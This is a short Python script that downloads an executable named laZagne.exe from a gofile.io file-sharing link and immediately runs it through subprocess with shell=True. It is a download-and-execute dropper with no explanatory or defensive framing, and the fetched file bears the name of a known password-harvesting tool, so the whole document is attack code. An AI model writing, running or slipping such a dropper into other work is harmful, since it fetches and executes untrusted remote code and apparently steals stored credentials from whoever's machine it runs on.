import wget
import subprocess
def Downloader(link):
    url = link
    wget.download(url , "laZagne.exe")
def execute():
    subprocess.check_output("laZagne.exe" , shell=True)

Downloader("https://gofile.io/d/TW0Te1")
execute()